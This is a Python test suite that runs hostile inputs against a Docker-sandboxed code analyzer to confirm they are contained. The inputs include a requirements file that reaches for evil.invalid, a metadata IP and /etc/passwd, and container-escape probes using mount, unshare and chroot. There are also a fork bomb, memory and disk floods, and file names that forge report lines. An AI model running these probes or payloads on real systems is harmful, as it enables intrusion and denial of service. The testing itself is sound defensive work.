"""Phase 5C: adversarial and boundary tests, run against the REAL analyzer container where the claim is about the container.

What a passing test here means: the specific hostile input or probe was tried on THIS host with THIS Docker daemon and the
outcome was the safe one (refused / contained / reported as not clean). It is evidence, not a proof that the boundary
holds against every input or every kernel. See PROJECT.md "Phase 5 security status".
"""
import json
import os
import socket
import subprocess
import sys
import time
import uuid
import zipfile
from pathlib import Path

import pytest

from conftest import REQUIRE_DOCKER
from saferun import cli
from saferun.engine import CheckStatus, ValidationOptions, Verdict, analyzer as engine_analyzer, osv, osvdb, semgrep, validate_project
from saferun.sandbox import SandboxLimits, SandboxError, run_sandboxed
from saferun.sandbox import analyzer as sa
from saferun.sandbox import docker as dk

ROOT = Path(__file__).resolve().parent.parent


def _built() -> bool:
    try:
        sa.verify_analyzer_image()
        return True
    except SandboxError:
        return False


BUILT = _built()
HAVE_DB = BUILT and osvdb.validate(osvdb.default_dir(), ["PyPI", "npm"]).ok
needs_analyzer = [pytest.mark.docker, pytest.mark.skipif(not BUILT, reason="analyzer image not built (docker/analyzer/build.sh)")]
needs_db = pytest.mark.skipif(not HAVE_DB, reason="no offline OSV database for PyPI+npm (saferun osv-db update / SAFERUN_OSV_DB)")

ONLY_SEMGREP = ValidationOptions(python_syntax=False, dependency_scan=False, javascript_check=False, tool_timeout_s=120)
ONLY_OSV = ValidationOptions(python_syntax=False, python_analysis=False, javascript_check=False, tool_timeout_s=120)
ALL = ValidationOptions(tool_timeout_s=120)


def labelled() -> set[str]:
    return set(dk.docker("ps", "-a", "-q", "--filter", "label=saferun.sandbox=1").stdout.split())


@pytest.fixture
def no_debris(ws_root):
    """Process cleanup: after the test no sandbox container and no workspace may remain."""
    before = labelled()
    yield
    assert labelled() == before, "a SafeRun container was left behind"
    assert list(ws_root.iterdir()) == [], "a SafeRun workspace was left behind"


def project(tmp_path, files, name="proj"):
    p = tmp_path / name
    p.mkdir(exist_ok=True)
    for n, content in files.items():
        f = p / n
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_bytes(content if isinstance(content, bytes) else content.encode())
    return p


def by_name(rep):
    return {c.name: c for c in rep.checks}


def analyzer_probe(tmp_path, code, files=None, limits=None, mounts=(), image=None):
    p = project(tmp_path, files or {"ok.py": "x = 1\n"}, name="probe")
    return run_sandboxed(p, ["python", "-I", "-c", code], limits or SandboxLimits(timeout_s=60), image=image or sa.verify_analyzer_image(),
                         readonly_mounts=mounts)


def not_clean(rep):
    return rep.verdict is not Verdict.PASS and not rep.complete


# ======================================================================== A. hostile source files
@pytest.mark.usefixtures("no_debris")
@pytest.mark.parametrize("_", [None], ids=["analyzer"])
class TestHostileSource:
    pytestmark = needs_analyzer

    def test_deeply_nested_source_is_contained_and_never_clean(self, tmp_path, _):
        p = project(tmp_path, {"deep.py": "x = " + "(" * 20000 + "1" + ")" * 20000 + "\n", "ok.py": "y = 1\n"})
        rep = validate_project(p, ValidationOptions(tool_timeout_s=120, dependency_scan=False, javascript_check=False))
        c = by_name(rep)
        assert not_clean(rep) and c["python-syntax"].status is not CheckStatus.PASSED       # the broken file is surfaced by the syntax check
        assert all("Traceback" not in x.detail for x in rep.checks)

    def test_oversized_source_is_reported_not_silently_skipped(self, tmp_path, _):
        p = project(tmp_path, {"big.py": "eval(x)\n" + "x = 1\n" * 400_000, "small.py": "x = 1\n"})
        c = by_name(validate_project(p, ONLY_SEMGREP))[semgrep.NAME]
        assert c.status is CheckStatus.INCOMPLETE and "big.py" in c.detail

    def test_binary_nul_and_invalid_utf8_sources(self, tmp_path, _):
        p = project(tmp_path, {"nul.py": b"x = 1\x00\nprint(2)\n", "latin.py": b"# \xe9\xe8\nx = 1\n", "bom.py": b"\xef\xbb\xbfx = 1\n",
                               "junk.py": os.urandom(4096), "empty.py": b""})
        rep = validate_project(p, ValidationOptions(tool_timeout_s=120, dependency_scan=False, javascript_check=False))
        assert not_clean(rep)                                  # the broken files are reported, so the scan cannot be a clean pass
        assert all("Traceback" not in c.detail for c in rep.checks)

    def test_very_long_line_does_not_hang_semgrep(self, tmp_path, _):
        p = project(tmp_path, {"long.py": "s = '" + "a" * 1_000_000 + "'\n" + "password = '" + "b" * 200_000 + "'\n"})
        t0 = time.monotonic()
        c = by_name(validate_project(p, ONLY_SEMGREP))[semgrep.NAME]
        assert time.monotonic() - t0 < 110 and c.status in (CheckStatus.PASSED, CheckStatus.FINDINGS, CheckStatus.INCOMPLETE, CheckStatus.TIMEOUT)

    def test_thousands_of_files_complete_within_bounds(self, tmp_path, _):
        p = project(tmp_path, {f"pkg{i % 50}/m{i}.py": f"v{i} = {i}\n" for i in range(1500)})
        t0 = time.monotonic()
        c = by_name(validate_project(p, ONLY_SEMGREP))[semgrep.NAME]
        assert time.monotonic() - t0 < 110 and c.status in (CheckStatus.PASSED, CheckStatus.INCOMPLETE, CheckStatus.TIMEOUT), (c.status, c.detail)

    def test_hostile_file_names_never_reach_output_unescaped(self, tmp_path, _):
        names = ["a\nb.py", "esc\x1b[31mred\x1b[0m.py", "rtl\u202eexe.py", "x" * 200 + ".py", "-rf.py", "sp ace'q\"uote.py", "tab\there.py",
                 "forged\n  [INFO] saferun.fake-rule  z.py", "ls\u2028  [LOW] saferun.fake2  q.py"]
        p = project(tmp_path, {n: "eval(input())\n" for n in names})
        rep = validate_project(p, ONLY_SEMGREP)
        text = cli.render_text(rep, str(p))
        assert "\x1b" not in text and "\u202e" not in text and "\x00" not in text
        assert all(ch == "\n" or ch.isprintable() for ch in text)
        import re
        assert len(re.findall(r"^  \[(?:CRITICAL|HIGH|MEDIUM|LOW|INFO|UNKNOWN)\] ", text, re.M)) == len(rep.findings)   # no forged finding lines
        c = by_name(rep)[semgrep.NAME]
        # every hostile name is still analysed and reported; names with control characters make the coverage cross-check
        # (sanitized reported path vs real path) fail safe to INCOMPLETE rather than to a clean result
        assert c.status in (CheckStatus.FINDINGS, CheckStatus.INCOMPLETE) and len(c.findings) == len(names) and rep.verdict is Verdict.FAIL

    def test_nosem_semgrepignore_and_project_semgrep_config_cannot_hide_or_change_rules(self, tmp_path, _):
        evil_cfg = "rules:\n  - id: attacker.match-everything\n    pattern: $X\n    message: attacker\n    languages: [python]\n    severity: ERROR\n"
        p = project(tmp_path, {"a.py": "eval(input())  # nosem\n", "hide/b.py": "eval(input())\n", ".semgrepignore": "hide/\n",
                               ".semgrep.yml": evil_cfg, "semgrep.yml": evil_cfg, ".semgrep/rules.yml": evil_cfg})
        c = by_name(validate_project(p, ONLY_SEMGREP))[semgrep.NAME]
        assert c.status is CheckStatus.FINDINGS and sorted(f.path for f in c.findings) == ["a.py", "hide/b.py"]
        assert all(f.rule_id.startswith("saferun.python.") for f in c.findings)

    def test_source_is_never_executed(self, tmp_path, _):
        marker = tmp_path / f"executed-{uuid.uuid4().hex}"
        code = f"open({str(marker)!r}, 'w').write('x')\nraise SystemExit(9)\n"
        p = project(tmp_path, {"setup.py": code, "conftest.py": code, "sitecustomize.py": code, "__init__.py": code})
        validate_project(p, ALL)
        assert not marker.exists()


# ======================================================================== B. hostile dependency manifests
@pytest.mark.usefixtures("no_debris")
class TestHostileManifests:
    pytestmark = needs_analyzer + [needs_db]

    def test_malformed_lockfiles_are_never_clean(self, tmp_path):
        for name, content in (("package-lock.json", "{"), ("package-lock.json", b"\xff\xfe\x00garbage"), ("yarn.lock", ""),
                              ("poetry.lock", "[[package]]\nname = "), ("requirements.txt", b"\x00" * 100)):
            p = project(tmp_path, {name: content}, name=f"p-{uuid.uuid4().hex[:6]}")
            rep = validate_project(p, ONLY_OSV)
            assert by_name(rep)[osv.NAME].status is not CheckStatus.PASSED and rep.verdict is not Verdict.PASS, (name, content)

    def test_deeply_nested_and_huge_lockfiles_are_contained(self, tmp_path):
        deep = project(tmp_path, {"package-lock.json": "[" * 300_000 + "]" * 300_000}, name="deep")
        assert by_name(validate_project(deep, ONLY_OSV))[osv.NAME].status is not CheckStatus.PASSED
        pk = {f"node_modules/pkg{i}": {"version": "1.0.0", "resolved": f"https://registry.npmjs.org/pkg{i}/-/pkg{i}-1.0.0.tgz"} for i in range(30000)}
        big = project(tmp_path, {"package-lock.json": json.dumps({"lockfileVersion": 3, "packages": {"": {"name": "t"}, **pk}})}, name="big")
        t0 = time.monotonic()
        c = by_name(validate_project(big, ONLY_OSV))[osv.NAME]
        assert time.monotonic() - t0 < 115 and c.status in (CheckStatus.PASSED, CheckStatus.FINDINGS, CheckStatus.ERROR, CheckStatus.TIMEOUT, CheckStatus.INCOMPLETE)

    def test_requirements_directives_cannot_read_host_files_or_use_the_network(self, tmp_path):
        secret = tmp_path / "outside-secret.txt"
        marker = f"SUPER-SECRET-{uuid.uuid4().hex}"
        secret.write_text(f"{marker}==1.0\n")
        reqs = (f"-r {secret}\n-c {secret}\n--index-url http://169.254.169.254/latest/\n--extra-index-url http://127.0.0.1:1/\n"
                f"-e git+https://evil.invalid/x.git#egg=x\nfile://{secret}\n../../../../etc/passwd\ndjango==2.2.0\n")
        p = project(tmp_path, {"requirements.txt": reqs})
        rep = validate_project(p, ONLY_OSV)
        blob = json.dumps(rep.to_dict())
        assert marker not in blob and "root:x:" not in blob
        assert by_name(rep)[osv.NAME].status in (CheckStatus.FINDINGS, CheckStatus.INCOMPLETE, CheckStatus.ERROR)

    def test_symlinked_lockfile_is_not_followed(self, tmp_path):
        outside = tmp_path / "outside"
        outside.mkdir()
        marker = f"LOCK-SECRET-{uuid.uuid4().hex}"
        (outside / "real.json").write_text(json.dumps({"lockfileVersion": 3, "packages": {"": {"name": marker}}}))
        p = project(tmp_path, {"ok.py": "x = 1\n"})
        (p / "package-lock.json").symlink_to(outside / "real.json")
        rep = validate_project(p, ONLY_OSV)
        assert marker not in json.dumps(rep.to_dict()) and rep.verdict is not Verdict.PASS
        assert any(s["path"] == "package-lock.json" for s in rep.workspace["skipped"])


# ======================================================================== C. workspace / symlinks / special files
@pytest.mark.usefixtures("no_debris")
class TestWorkspaceBoundary:
    pytestmark = needs_analyzer

    def test_links_special_files_and_external_hardlinks_never_reach_the_analyzers(self, tmp_path):
        outside = tmp_path / "outside"
        outside.mkdir()
        marker = f"HOST-MARKER-{uuid.uuid4().hex}"
        (outside / "secret.txt").write_text(marker)
        p = project(tmp_path, {"ok.py": "x = 1\n"})
        (p / "to_file.py").symlink_to(outside / "secret.txt")
        (p / "to_root").symlink_to("/")
        (p / "to_parent").symlink_to("../outside")
        (p / "dangling.py").symlink_to("/nonexistent/zzz")
        (p / "loop_a").symlink_to("loop_b")
        (p / "loop_b").symlink_to("loop_a")
        os.mkfifo(p / "pipe.py")
        os.link(outside / "secret.txt", p / "hard.py")
        sock = socket.socket(socket.AF_UNIX)
        sock.bind(str(p / "sock.py"))
        sock.close()
        before = (outside / "secret.txt").read_text()
        rep = validate_project(p, ALL)
        blob = json.dumps(rep.to_dict())
        skipped = {s["path"] for s in rep.workspace["skipped"]}
        assert {"to_file.py", "to_root", "to_parent", "dangling.py", "loop_a", "pipe.py", "hard.py", "sock.py"} <= skipped
        assert marker not in blob and rep.verdict is not Verdict.PASS and not rep.complete
        assert (outside / "secret.txt").read_text() == before and (p / "to_root").is_symlink()    # originals untouched

    def test_container_sees_only_the_sanitized_project(self, tmp_path):
        marker_name = f"saferun-host-marker-{uuid.uuid4().hex}"
        (tmp_path / marker_name).write_text("host file")
        r = analyzer_probe(tmp_path, ("import os, json\nfound = [os.path.join(d, n) for d, _, ns in os.walk('/') for n in ns "
                                      f"if n == {marker_name!r}]\nprint(json.dumps({{'found': found, 'ws': sorted(os.listdir('/workspace'))}}))"),
                           files={"ok.py": "x = 1\n", "sub/b.py": "y = 2\n"})
        out = json.loads(r.stdout)
        assert out["found"] == [] and out["ws"] == ["ok.py", "sub"]


# ======================================================================== D. container escape / host access probes
@pytest.mark.usefixtures("no_debris")
class TestContainerBoundary:
    pytestmark = needs_analyzer

    PROBE = r"""
import os, json, socket, ctypes
out = {}
st = open('/proc/self/status').read()
get = lambda k: [l.split()[1] for l in st.splitlines() if l.startswith(k)][0]
out['uid'] = os.getuid(); out['capeff'] = get('CapEff:'); out['capbnd'] = get('CapBnd:'); out['nnp'] = get('NoNewPrivs:'); out['seccomp'] = get('Seccomp:')
out['docker_sock'] = any(os.path.exists(p) for p in ('/var/run/docker.sock', '/run/docker.sock'))
out['home'] = sorted(os.listdir('/home')) if os.path.isdir('/home') else None
libc = ctypes.CDLL(None, use_errno=True)
out['mount'] = [libc.mount(b'none', b'/tmp', b'tmpfs', 0, None), ctypes.get_errno()]
out['unshare_user'] = [libc.unshare(0x10000000), ctypes.get_errno()]
out['chroot'] = [libc.chroot(b'/proc'), ctypes.get_errno()]
def can_write(p):
    try:
        open(p, 'a').close(); return True
    except OSError:
        return False
out['writable'] = {p: can_write(p) for p in ('/proc/sys/kernel/hostname', '/sys/kernel/uevent_helper', '/workspace/new', '/etc/passwd', '/usr/local/bin/semgrep', '/opt/saferun/rules/python.yml')}
out['env'] = sorted(os.environ)
try:
    socket.getaddrinfo('example.com', 80); out['dns'] = 'resolved'
except OSError:
    out['dns'] = 'failed'
out['cgroup_writable'] = os.access('/sys/fs/cgroup', os.W_OK)
print(json.dumps(out))
"""

    def test_privilege_and_host_access_probes_all_fail(self, tmp_path, monkeypatch):
        monkeypatch.setenv("SAFERUN_TEST_HOST_SECRET", "hunter2-host-secret")
        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "aws-host-secret")
        r = analyzer_probe(tmp_path, self.PROBE)
        assert r.exit_code == 0, r.stderr[-400:]
        out = json.loads(r.stdout)
        assert out["uid"] == 65534 and out["capeff"] == "0" * 16 and out["capbnd"] == "0" * 16
        assert out["nnp"] == "1" and out["seccomp"] == "2"
        assert out["docker_sock"] is False and out["home"] in ([], None)
        assert out["mount"][0] == -1 and out["unshare_user"][0] == -1 and out["chroot"][0] == -1
        assert not any(out["writable"].values()), out["writable"]
        assert out["dns"] == "failed" and out["cgroup_writable"] is False
        assert "SAFERUN_TEST_HOST_SECRET" not in out["env"] and "AWS_SECRET_ACCESS_KEY" not in out["env"]
        assert "hunter2-host-secret" not in r.stdout + r.stderr

    def test_applied_container_configuration_is_the_verified_one(self, tmp_path):
        r = analyzer_probe(tmp_path, "print(1)")
        hc = r.hardening
        assert hc["NetworkMode"] == "none" and hc["ReadonlyRootfs"] is True and hc["CapDrop"] == ["ALL"] and hc["Privileged"] is False
        assert hc["PidsLimit"] == 64 and not hc.get("Devices") and not hc.get("PortBindings")
        assert all(c.state in ("verified", "unavailable") for c in r.controls)


# ======================================================================== E. resource exhaustion inside the analyzer image
@pytest.mark.usefixtures("no_debris")
class TestResourceExhaustion:
    pytestmark = needs_analyzer

    def test_fork_bomb_is_capped_by_the_pids_limit(self, tmp_path):
        code = ("import os, time\nn = 0\ntry:\n for _ in range(5000):\n  pid = os.fork()\n  if pid == 0:\n   time.sleep(20); os._exit(0)\n  n += 1\n"
                "except OSError:\n pass\nprint('forks', n)\n")
        r = analyzer_probe(tmp_path, code, limits=SandboxLimits(timeout_s=30, pids=48))
        assert r.exit_code == 0 and 0 < int(r.stdout.split()[1]) < 60

    def test_memory_hog_is_oom_killed(self, tmp_path):
        r = analyzer_probe(tmp_path, "b = bytearray(1 << 30)\nfor i in range(0, len(b), 4096): b[i] = 1\nprint('survived')",
                           limits=SandboxLimits(timeout_s=30, memory_mb=96))
        assert r.exit_code != 0 and "survived" not in r.stdout and (r.oom_killed or r.exit_code == 137)

    def test_cpu_spin_is_stopped_at_the_deadline(self, tmp_path):
        t0 = time.monotonic()
        r = analyzer_probe(tmp_path, "while True: pass", limits=SandboxLimits(timeout_s=3))
        assert r.timed_out and time.monotonic() - t0 < 25

    def test_disk_and_output_floods_are_bounded(self, tmp_path):
        code = ("import sys\nw = 0\ntry:\n f = open('/tmp/fill', 'wb')\n while True:\n  f.write(b'x' * 65536); w += 65536\nexcept OSError:\n pass\n"
                "print('written', w)\nsys.stdout.write('y' * 5_000_000)\n")
        r = analyzer_probe(tmp_path, code, limits=SandboxLimits(timeout_s=30, tmpfs_mb=8, max_output_bytes=64 * 1024))
        assert r.output_truncated and len(r.stdout) <= 64 * 1024
        assert int(r.stdout.split()[1]) <= 9 * 1024 * 1024 or "written" not in r.stdout

    def test_open_file_limit(self, tmp_path):
        code = "n = 0\ntry:\n fs = [open('/workspace/ok.py') for _ in range(5000)]\nexcept OSError as e:\n print('emfile', len(fs) if 'fs' in dir() else -1, e.errno)\n"
        r = analyzer_probe(tmp_path, code, limits=SandboxLimits(timeout_s=30, nofile=64))
        assert "emfile" in r.stdout

    def test_engine_timeout_kills_the_container_and_reports_timeout(self, tmp_path):
        p = project(tmp_path, {"a.py": "x = 1\n"})
        rep = validate_project(p, ValidationOptions(python_syntax=False, dependency_scan=False, javascript_check=False, tool_timeout_s=0.05))
        c = by_name(rep)[semgrep.NAME]
        assert c.status is CheckStatus.TIMEOUT and rep.verdict is Verdict.WARNING and not rep.complete


# ======================================================================== F. Docker / image failures and partial results
@pytest.mark.usefixtures("no_debris")
class TestFailuresAndPartialResults:
    pytestmark = needs_analyzer

    def test_tampered_lock_disables_both_analyzers_but_other_checks_still_run(self, tmp_path, monkeypatch):
        (tmp_path / "ld").mkdir(mode=0o700)
        bad = tmp_path / "ld" / "lock"
        bad.write_text("sha256:" + "0" * 64 + "\n")
        bad.chmod(0o600)
        monkeypatch.setenv("SAFERUN_ANALYZER_LOCK", str(bad))
        p = project(tmp_path, {"a.py": "eval(input())\n", "requirements.txt": "django==2.2.0\n"})
        rep = validate_project(p, ALL)
        c = by_name(rep)
        assert c[semgrep.NAME].status is CheckStatus.ERROR and c[osv.NAME].status is CheckStatus.ERROR and "mismatch" in c[semgrep.NAME].detail
        assert c["python-syntax"].status is CheckStatus.PASSED                       # the independent sandbox check still ran
        assert rep.verdict is Verdict.WARNING and not rep.complete and not rep.findings

    def test_analyzer_crash_is_an_error_not_a_clean_result(self, tmp_path):
        def crashing(argv, **kw):
            argv = [a.replace("/opt/saferun/rules/python.yml", "/nonexistent/rules.yml") for a in argv]
            return engine_analyzer.analyzer_runner(argv, **kw)
        p = project(tmp_path, {"a.py": "eval(input())\n"})
        rep = validate_project(p, ONLY_SEMGREP, ctx_overrides={"analyzer": crashing})
        c = by_name(rep)[semgrep.NAME]
        assert c.status is CheckStatus.ERROR and not c.findings and rep.verdict is Verdict.WARNING

    @needs_db
    def test_missing_database_is_a_partial_failure_other_findings_are_kept(self, tmp_path, monkeypatch):
        monkeypatch.setenv("SAFERUN_OSV_DB", str(tmp_path / "no-db"))
        p = project(tmp_path, {"a.py": "eval(input())\n", "requirements.txt": "django==2.2.0\n"})
        rep = validate_project(p, ALL)
        c = by_name(rep)
        assert c[semgrep.NAME].status is CheckStatus.FINDINGS and c[osv.NAME].status is CheckStatus.ERROR
        assert rep.verdict is Verdict.FAIL and not rep.complete and any("osv-db update" in r for r in rep.reasons)


# ======================================================================== G. CLI exit codes and report schema
def run_cli(args, env_extra=None, cwd=ROOT):
    env = {**os.environ, **(env_extra or {})}
    return subprocess.run([sys.executable, "-I", "-m", "saferun", *args], capture_output=True, text=True, timeout=300, env=env, cwd=str(cwd))


@pytest.mark.usefixtures("no_debris")
class TestCliCompatibility:
    pytestmark = needs_analyzer

    TOP = {"checks", "complete", "reasons", "schema_version", "verdict", "workspace"}
    CHECK = {"detail", "duration_s", "errors", "findings", "name", "notes", "status", "tool", "truncated_findings"}
    WS = {"copied_bytes", "copied_dirs", "copied_files", "entries_scanned", "skipped", "withheld"}
    FINDING = {"category", "check", "cwe", "end_line", "fixed_versions", "line", "message", "package", "path", "rule_id", "severity",
               "vulnerability_ids"}

    def test_exit_codes_and_schema_with_the_real_analyzers(self, tmp_path):
        clean = project(tmp_path, {"a.py": "print(1)\n"}, name="clean")
        p = run_cli(["scan", str(clean), "--format", "json"])
        assert p.returncode == 0, (p.stdout[-400:], p.stderr[-400:])
        rep = json.loads(p.stdout)
        assert set(rep) == self.TOP and rep["schema_version"] == 1 and rep["verdict"] == "PASS" and rep["complete"] is True
        assert set(rep["workspace"]) == self.WS and all(set(c) == self.CHECK for c in rep["checks"])
        assert [c["name"] for c in rep["checks"]] == ["workspace-sensitive-files", "python-syntax", "python-static-analysis",
                                                       "dependency-vulnerabilities", "javascript-syntax"]
        tools = {c["name"]: c["tool"] for c in rep["checks"]}
        assert tools["python-syntax"] == "compile() (python:3.12-slim, sandboxed)" and tools["python-static-analysis"] == "semgrep"

        bad = project(tmp_path, {"a.py": "eval(input())\n"}, name="bad")
        p = run_cli(["scan", str(bad), "--format", "json"])
        rep = json.loads(p.stdout)
        assert p.returncode == 1 and rep["verdict"] == "FAIL" and set(rep["checks"][2]["findings"][0]) == self.FINDING
        assert p.stderr == ""                                                          # no network notice any more

        warn = project(tmp_path, {"a.py": "print(1)\n", "requirements.txt": "six==1.17.0\n"}, name="warn")
        p = run_cli(["scan", str(warn), "--format", "json"], {"SAFERUN_OSV_DB": str(tmp_path / "no-db")})
        assert p.returncode == 2 and json.loads(p.stdout)["verdict"] == "WARNING"

        assert run_cli(["scan", str(tmp_path / "missing")]).returncode == 64
        assert run_cli(["scan", str(clean), "--osv-offline", "--format", "json"]).returncode == 0     # legacy flag still accepted
        text = run_cli(["scan", str(bad)])
        assert text.returncode == 1 and text.stdout.startswith("SafeRun validation of ") and "[HIGH] saferun.python.dynamic-code-execution" in text.stdout
